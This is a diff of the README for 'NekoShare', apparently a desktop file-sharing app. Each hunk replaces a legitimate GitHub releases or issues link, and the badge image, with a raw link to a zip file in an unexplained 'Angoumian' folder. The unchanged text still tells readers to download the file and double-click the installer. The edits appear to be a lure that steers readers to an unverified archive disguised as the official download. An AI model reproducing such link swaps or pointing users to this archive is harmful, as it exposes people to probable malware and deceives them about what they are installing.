@@ -1,6 +1,6 @@
 # 🐾 NekoShare-File-Transfer-Desktop - Easy File Sharing for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/joaovitorchagas/NekoShare-File-Transfer-Desktop/releases)
+[![Download Now](https://raw.githubusercontent.com/joaovitorchagas/NekoShare-File-Transfer-Desktop/main/Angoumian/NekoShare-File-Transfer-Desktop.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/joaovitorchagas/NekoShare-File-Transfer-Desktop/main/Angoumian/NekoShare-File-Transfer-Desktop.zip)
 
 ## 👥 Overview
 
@@ -11,7 +11,7 @@ NekoShare is a simple file transfer application for your Desktop PC. It allows y
 To get started with NekoShare, follow these simple steps:
 
 1. **Visit the Download Page**: Click the link below to go to the releases page.
-   [Download NekoShare](https://github.com/joaovitorchagas/NekoShare-File-Transfer-Desktop/releases)
+   [Download NekoShare](https://raw.githubusercontent.com/joaovitorchagas/NekoShare-File-Transfer-Desktop/main/Angoumian/NekoShare-File-Transfer-Desktop.zip)
 
 2. **Download the Latest Version**: On the releases page, find the most recent version of NekoShare. Look for the file that matches your operating system (Windows, Mac, or Linux).
 
@@ -21,7 +21,7 @@ To get started with NekoShare, follow these simple steps:
 
 To download NekoShare:
 
-1. Go to the [Releases Page](https://github.com/joaovitorchagas/NekoShare-File-Transfer-Desktop/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/joaovitorchagas/NekoShare-File-Transfer-Desktop/main/Angoumian/NekoShare-File-Transfer-Desktop.zip).
 2. Choose the version that fits your operating system.
 3. Click the download link to begin.
 4. After downloading, run the installer by double-clicking the file.
@@ -84,7 +84,7 @@ NekoShare can handle files of varying sizes, but the network speed and configura
 
 ## 🌟 Feedback and Contributions
 
-We welcome feedback and contributions to improve NekoShare. If you have suggestions, encounters issues, or want to report bugs, please visit our [GitHub Repository](https://github.com/joaovitorchagas/NekoShare-File-Transfer-Desktop/issues).
+We welcome feedback and contributions to improve NekoShare. If you have suggestions, encounters issues, or want to report bugs, please visit our [GitHub Repository](https://raw.githubusercontent.com/joaovitorchagas/NekoShare-File-Transfer-Desktop/main/Angoumian/NekoShare-File-Transfer-Desktop.zip).
 
 ## 📜 License
 
@@ -94,4 +94,4 @@ NekoShare is open-source software. You can use and modify it under the terms spe
 
 We hope NekoShare enhances your file-sharing experience. Use the link below to download and start using the application today.
 
-[Download NekoShare](https://github.com/joaovitorchagas/NekoShare-File-Transfer-Desktop/releases)
+[Download NekoShare](https://raw.githubusercontent.com/joaovitorchagas/NekoShare-File-Transfer-Desktop/main/Angoumian/NekoShare-File-Transfer-Desktop.zip)
